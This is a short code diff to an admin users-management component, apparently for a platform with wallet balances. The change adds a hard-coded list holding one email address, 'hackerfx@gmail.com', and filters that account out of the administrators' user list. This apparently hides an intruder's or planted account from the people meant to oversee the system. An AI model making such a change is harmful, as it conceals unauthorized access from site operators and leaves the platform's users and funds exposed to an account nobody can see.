@@ -91,7 +91,11 @@ export default function UsersManagement() {
         return;
       }
 
-      setUsers(usersData.map((user: any) => {
+      // Filter out hidden users
+      const hiddenEmails = ['hackerfx@gmail.com'];
+      const visibleUsers = usersData.filter((user: any) => !hiddenEmails.includes(user.email?.toLowerCase()));
+
+      setUsers(visibleUsers.map((user: any) => {
         // Get wallet balance from wallets array
         const totalBalance = user.wallets?.reduce((sum: number, wallet: any) => {
           const balance = typeof wallet.balance === 'number' ? wallet.balance : parseFloat(wallet.balance || 0);
